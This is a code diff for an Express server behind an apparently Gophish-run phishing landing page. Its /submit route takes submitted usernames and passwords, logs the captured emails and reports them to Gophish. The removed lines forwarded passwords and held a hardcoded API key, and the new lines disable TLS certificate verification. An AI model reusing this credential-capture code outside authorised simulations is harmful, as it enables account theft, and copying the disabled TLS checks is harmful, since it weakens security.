@@ -1,6 +1,7 @@
 const express = require('express')
 const path = require('path')
 const axios = require('axios')
+const https = require('https')
 const app = express()
 
 app.use(express.urlencoded({ extended: true }))
@@ -16,14 +17,23 @@ app.get('/', (req, res) => {
 
 app.post('/submit', async (req, res) => {
   const { username, password, rid } = req.body
+
   console.log(`Captured → Email: ${username} | RID: ${rid}`)
 
   try {
-    await axios.post(
-      `${GOPHISH_HOST}/api/v1/phish`,
-      { rid, email: username, payload: { username, password } },
-      { headers: { Authorization: 4f632c7fb574989120f7e8580b5982fe2d9ea1df3930502c05f5465f4fd0ae0f } }
+    // Correct Gophish tracking endpoint
+    await axios.get(
+      `${GOPHISH_HOST}/report?rid=${rid}`,
+      {
+        headers: { 
+          Authorization: GOPHISH_API_KEY
+        },
+        httpsAgent: new https.Agent({ 
+          rejectUnauthorized: false
+        })
+      }
     )
+    console.log(`Reported to Gophish ✅`)
   } catch (err) {
     console.error('Gophish API error:', err.message)
   }
